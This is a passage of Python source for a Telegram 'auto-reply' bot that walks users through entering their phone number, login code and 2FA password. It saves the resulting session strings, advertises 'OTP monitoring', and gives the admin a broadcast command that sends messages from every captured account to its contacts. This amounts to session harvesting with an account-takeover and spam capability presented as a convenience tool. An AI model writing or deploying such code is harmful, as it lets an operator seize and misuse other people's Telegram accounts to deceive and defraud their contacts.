                f"📊 **Bot Statistics**\n\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📱 **Total Accounts:** {total_accounts}\n"
                f"🟢 **Active:** {active_accounts}\n"
                f"🔴 **Inactive:** {total_accounts - active_accounts}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"⚙️ **Reply Modes:**\n"
                f"• Offline: {offline_count}\n"
                f"• Online: {online_count}\n"
                f"• Both: {both_count}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📨 **Auto-Reply Messages:** {total_messages}\n"
                f"👥 **Bot Users:** {total_users}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"🤖 **Bot Status:** ✅ Running\n"
                f"⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}"
            )
            
            await event.edit(
                stats_text,
                buttons=[
                    [Button.inline("🔄 Refresh", b"stats")],
                    [Button.inline("🔙 Back", b"main_menu")]
                ]
            )
        
        # ============ TEXT MESSAGE HANDLER ============
        @self.bot.on(events.NewMessage)
        async def handle_text(event):
            if event.text.startswith('/'):
                return
            
            user_id = event.sender_id
            text = event.text.strip()
            
            # Handle phone number input
            if user_id in self.pending_phone:
                del self.pending_phone[user_id]
                
                phone = text.replace(' ', '').replace('-', '')
                if not phone.startswith('+'):
                    phone = '+' + phone
                
                # Validate phone format
                if not re.match(r'^\+[1-9]\d{7,14}$', phone):
                    await event.reply(
                        "❌ **Invalid Format!**\n\n"
                        "Use international format:\n"
                        "`+919876543210`",
                        buttons=[
                            [Button.inline("🔄 Try Again", b"add_account")],
                            [Button.inline("🔙 Cancel", b"main_menu")]
                        ]
                    )
                    return
                
                # Check if already exists
                if phone in self.accounts:
                    await event.reply(
                        f"⚠️ **Account Already Exists!**\n\n"
                        f"Phone: `{phone}`",
                        buttons=[[Button.inline("🔙 Back", b"main_menu")]]
                    )
                    return
                
                # Start login process
                loading_msg = await event.reply("⏳ **Connecting...**")
                
                try:
                    # Create new client for this phone
                    session_file = f'{SESSIONS_DIR}/{phone.replace("+", "").replace(" ", "")}'
                    client = TelegramClient(session_file, API_ID, API_HASH)
                    
                    await client.connect()
                    
                    # Send OTP
                    await loading_msg.edit("📤 **Sending OTP...**")
                    result = await client.send_code_request(phone)
                    
                    # Store client and phone hash
                    self.temp_clients[user_id] = {
                        'client': client,
                        'phone': phone,
                        'phone_code_hash': result.phone_code_hash
                    }
                    
                    self.pending_otp[user_id] = True
                    
                    await loading_msg.edit(
                        f"✅ **OTP Sent Successfully!**\n\n"
                        f"📱 Phone: `{phone}`\n"
                        f"📨 Check your Telegram app\n\n"
                        f"🔢 **Enter the 5-digit code:**\n"
                        f"Format: `Login code: XXXXX`\n\n"
                        f"⚠️ Enter only the 5 digits",
                        buttons=[[Button.inline("❌ Cancel", b"cancel_add")]]
                    )
                    
                except FloodWaitError as e:
                    await loading_msg.edit(
                        f"⏳ **Too Many Requests!**\n\n"
                        f"Wait {e.seconds} seconds and try again.",
                        buttons=[[Button.inline("🔙 Back", b"main_menu")]]
                    )
                    if user_id in self.temp_clients:
                        await self.temp_clients[user_id]['client'].disconnect()
                        del self.temp_clients[user_id]
                    
                except Exception as e:
                    await loading_msg.edit(
                        f"❌ **Error Occurred!**\n\n"
                        f"Error: `{str(e)[:100]}`\n\n"
                        f"Common issues:\n"
                        f"• Wrong phone number\n"
                        f"• Number not registered\n"
                        f"• Network issues",
                        buttons=[
                            [Button.inline("🔄 Try Again", b"add_account")],
                            [Button.inline("🔙 Back", b"main_menu")]
                        ]
                    )
                    if user_id in self.temp_clients:
                        await self.temp_clients[user_id]['client'].disconnect()
                        del self.temp_clients[user_id]
                return
            
            # Handle OTP input
            if user_id in self.pending_otp:
                if user_id not in self.temp_clients:
                    await event.reply(
                        "❌ **Session expired!**\n\n"
                        "Please start again.",
                        buttons=[[Button.inline("🔄 Try Again", b"add_account")]]
                    )
                    del self.pending_otp[user_id]
                    return
                
                otp = text.replace(' ', '').replace('-', '')
                
                data = self.temp_clients[user_id]
                client = data['client']
                phone = data['phone']
                phone_code_hash = data['phone_code_hash']
                
                loading_msg = await event.reply("⏳ **Verifying OTP...**")
                
                try:
                    # Sign in with OTP
                    await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
                    
                    # Get user info
                    me = await client.get_me()
                    
                    # Create StringSession for storage
                    session_string = StringSession.save(client.session)
                    
                    # Save account
                    self.accounts[phone] = {
                        'phone': phone,
                        'user_id': me.id,
                        'first_name': me.first_name or 'Unknown',
                        'last_name': me.last_name or '',
                        'username': me.username or '',
                        'has_2fa': False,
                        'owner': user_id,
                        'login_date': str(datetime.now()),
                        'status': 'active',
                        'session_string': session_string
                    }
                    self.save_accounts()
                    
                    # Initialize settings
                    self.settings[phone] = {
                        'reply_mode': 'offline',
                        'auto_reply': True
                    }
                    self.save_settings()
                    
                    # Add to user's account list
                    if str(user_id) not in self.users:
                        self.users[str(user_id)] = {'accounts': []}
                    if phone not in self.users[str(user_id)].get('accounts', []):
                        self.users[str(user_id)].setdefault('accounts', []).append(phone)
                        self.save_users()
                    
                    # Start monitoring
                    self.user_clients[phone] = client
                    await self.start_user_client(phone, session_string)
                    
                    # Clean up
                    del self.pending_otp[user_id]
                    del self.temp_clients[user_id]
                    
                    country_code = self.get_country_code(phone)
                    
                    await loading_msg.edit(
                        f"✅ **Account Added Successfully!**\n\n"
                        f"━━━━━━━━━━━━━━━\n"
                        f"📱 **Phone:** `{phone}`\n"
                        f"🌍 **Country:** {country_code}\n"
                        f"👤 **Name:** {me.first_name}\n"
                        f"📧 **Username:** @{me.username or 'None'}\n"
                        f"🆔 **User ID:** `{me.id}`\n"
                        f"🔐 **2FA:** ❌ No\n"
                        f"━━━━━━━━━━━━━━━\n"
                        f"⚙️ **Default Settings:**\n"
                        f"• Reply Mode: OFFLINE\n"
                        f"• Auto-Reply: ON ✅\n"
                        f"━━━━━━━━━━━━━━━\n\n"
                        f"✅ OTP monitoring active!",
                        buttons=[[Button.inline("🏠 Main Menu", b"main_menu")]]
                    )
                    
                except SessionPasswordNeededError:
                    # 2FA required
                    self.pending_2fa[user_id] = True
                    del self.pending_otp[user_id]
                    
                    await loading_msg.edit(
                        "🔐 **2-Factor Authentication Required!**\n\n"
                        "Your account has 2FA enabled.\n\n"
                        "🔑 **Enter your 2FA password:**",
                        buttons=[[Button.inline("❌ Cancel", b"cancel_add")]]
                    )
                    
                except PhoneCodeInvalidError:
                    await loading_msg.edit(
                        "❌ **Wrong OTP!**\n\n"
                        "Please enter correct 5-digit code:",
                        buttons=[[Button.inline("❌ Cancel", b"cancel_add")]]
                    )
                    
                except Exception as e:
                    error_msg = str(e)
                    
                    await loading_msg.edit(
                        f"❌ **Login Failed!**\n\n"
                        f"Error: `{error_msg[:100]}`\n\n"
                        f"Try again with correct OTP.",
                        buttons=[
                            [Button.inline("🔄 Try Again", b"add_account")],
                            [Button.inline("🔙 Back", b"main_menu")]
                        ]
                    )
                    
                    # Clean up
                    del self.pending_otp[user_id]
                    if user_id in self.temp_clients:
                        await self.temp_clients[user_id]['client'].disconnect()
                        del self.temp_clients[user_id]
                return
            
            # Handle 2FA password
            if user_id in self.pending_2fa:
                del self.pending_2fa[user_id]
                
                if user_id not in self.temp_clients:
                    await event.reply(
                        "❌ **Session expired!**",
                        buttons=[[Button.inline("🔄 Try Again", b"add_account")]]
                    )
                    return
                
                password = text
                
                data = self.temp_clients[user_id]
                client = data['client']
                phone = data['phone']
                
                loading_msg = await event.reply("⏳ **Verifying password...**")
                
                try:
                    await client.sign_in(password=password)
                    
                    me = await client.get_me()
                    session_string = StringSession.save(client.session)
                    
                    self.accounts[phone] = {
                        'phone': phone,
                        'user_id': me.id,
                        'first_name': me.first_name or 'Unknown',
                        'last_name': me.last_name or '',
                        'username': me.username or '',
                        'has_2fa': True,
                        'owner': user_id,
                        'login_date': str(datetime.now()),
                        'status': 'active',
                        'session_string': session_string
                    }
                    self.save_accounts()
                    
                    self.settings[phone] = {
                        'reply_mode': 'offline',
                        'auto_reply': True
                    }
                    self.save_settings()
                    
                    if str(user_id) not in self.users:
                        self.users[str(user_id)] = {'accounts': []}
                    if phone not in self.users[str(user_id)].get('accounts', []):
                        self.users[str(user_id)].setdefault('accounts', []).append(phone)
                        self.save_users()
                    
                    self.user_clients[phone] = client
                    await self.start_user_client(phone, session_string)
                    
                    del self.temp_clients[user_id]
                    
                    country_code = self.get_country_code(phone)
                    
                    await loading_msg.edit(
                        f"✅ **Account Added Successfully!**\n\n"
                        f"━━━━━━━━━━━━━━━\n"
                        f"📱 **Phone:** `{phone}`\n"
                        f"🌍 **Country:** {country_code}\n"
                        f"👤 **Name:** {me.first_name}\n"
                        f"📧 **Username:** @{me.username or 'None'}\n"
                        f"🆔 **User ID:** `{me.id}`\n"
                        f"🔐 **2FA:** ✅ Verified\n"
                        f"━━━━━━━━━━━━━━━\n"
                        f"⚙️ **Default Settings:**\n"
                        f"• Reply Mode: OFFLINE\n"
                        f"• Auto-Reply: ON ✅\n"
                        f"━━━━━━━━━━━━━━━\n\n"
                        f"✅ OTP monitoring active!",
                        buttons=[[Button.inline("🏠 Main Menu", b"main_menu")]]
                    )
                    
                except Exception as e:
                    self.pending_2fa[user_id] = True
                    
                    await loading_msg.edit(
                        f"❌ **Wrong Password!**\n\n"
                        f"Try again:",
                        buttons=[[Button.inline("❌ Cancel", b"cancel_add")]]
                    )
                return
            
            # Handle add message
            if user_id in self.pending_message:
                del self.pending_message[user_id]
                
                self.messages.append({
                    'text': text,
                    'added_by': user_id,
                    'date': str(datetime.now())
                })
                self.save_messages()
                
                await event.reply(
                    f"✅ **Message Added!**\n\n"
                    f"━━━━━━━━━━━━━━━\n"
                    f"{text}\n"
                    f"━━━━━━━━━━━━━━━",
                    buttons=[
                        [Button.inline("➕ Add More", b"add_message")],
                        [Button.inline("📋 View All", b"view_messages")],
                        [Button.inline("🏠 Main Menu", b"main_menu")]
                    ]
                )
                return
            
            # Handle broadcast message
            if user_id in self.pending_broadcast and user_id == ADMIN_ID:
                del self.pending_broadcast[user_id]
                
                status_msg = await event.reply(
                    "📢 **Starting Broadcast...**\n\n"
                    "⏳ Please wait..."
                )
                
                total_sent = 0
                total_failed = 0
                
                for phone, client in self.user_clients.items():
                    if not client.is_connected():
                        continue
                    
                    try:
                        dialogs = await client.get_dialogs(limit=50)
                        
                        for dialog in dialogs:
                            try:
                                if dialog.is_user and dialog.entity.bot:
                                    continue
                                
                                await client.send_message(dialog.id, text)
                                total_sent += 1
                                
                                if total_sent % 10 == 0:
                                    await status_msg.edit(
                                        f"📢 **Broadcasting...**\n\n"
                                        f"✅ Sent: {total_sent}\n"
                                        f"❌ Failed: {total_failed}"
                                    )
                                
                                await asyncio.sleep(1)
                                
                            except:
                                total_failed += 1
                    except:
                        pass
                
                await status_msg.edit(
                    f"✅ **Broadcast Complete!**\n\n"
                    f"━━━━━━━━━━━━━━━\n"
                    f"📨 **Message:**\n{text[:100]}...\n"
                    f"━━━━━━━━━━━━━━━\n\n"
                    f"📊 **Results:**\n"
                    f"✅ Sent: {total_sent}\n"
                    f"❌ Failed: {total_failed}",
                    buttons=[[Button.inline("🏠 Main Menu", b"main_menu")]]
                )
                return
        
        #ACK ============
        @self.bot.on(events.CallbackQuery(data=b"cancel_add"))
        async def cancel_add(event):
            user_id = event.sender_id
            
            # Clean up all pending states
            for pending_dict in [self.pending_phone, self.pending_otp, self.pending_2fa]:
                if user_id in pending_dict:
                    del pending_dict[user_id]
            
            # Disconnect temp client
            if user_id in self.temp_clients:
                try:
                    await self.temp_clients[user_id]['client'].disconnect()
                except:
                    pass
                del self.temp_clients[user_id]
            
            await event.edit(
                "❌ **Cancelled!**",
                buttons=[[Button.inline("🏠 Main Menu", b"main_menu")]]
            )
        
        print("🤖 Bot is running... Press Ctrl+C to stop")
        await self.bot.run_until_disconnected()

# ============ MAIN ============
if __name__ == '__main__':
    print("=" * 50)
    print("🚀 Starting Telegram Auto-Reply Bot")
    print("=" * 50)
    print(f"📱 Admin ID: {ADMIN_ID}")
    print(f"🔑 API ID: {API_ID}")
    print("=" * 50)
    
    bot = AutoReplyBot()
    
    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped!")
    except Exception as e:
        print(f"\n❌ Fatal Error: {e}")
                
